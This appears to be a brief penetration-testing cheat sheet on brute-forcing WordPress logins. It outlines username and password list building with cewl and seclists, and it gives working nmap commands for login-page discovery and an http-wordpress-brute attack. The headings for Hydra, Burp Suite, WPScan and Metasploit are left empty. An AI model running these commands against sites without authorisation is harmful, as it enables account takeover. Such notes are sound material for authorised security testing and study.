# Wordpress Brute Forcing

## Step 1 : Enumerate users

* Default username "admin".
* If not then use an intelligent userlist using "cewl" or common usernames using seclists. To enumerate valid usernames.
* Verify the enumerate usernames

## Step 2 : Password list

* First try to find a webpage to get a more probable list of password using "cewl".
* If not found then use common password lists from "seclists".

## Step 3 : Perform the online password cracking

### Nmap : Wordpress login brute force

* The nmap automatically discovers the exact login page using `nmap -p80 --script http-enum 192.168.1.17`

`nmap –sV --script http-wordpress-brute --script-args 'userdb=/root/Desktop/login.txt,passdb=/root/Desktop/pass.txt, http-wordpress-brute.hostname=domain.com,http-wordpress-brute.thread=3,brute.firstonly=true' 192.168.1.17`

### Hydra : Wordpress login brute force

### Brup Suite : Wordpress login Brute force

### WPScan : Wordpress login Brute force

### Metasploit : Wordpress loign Brute force







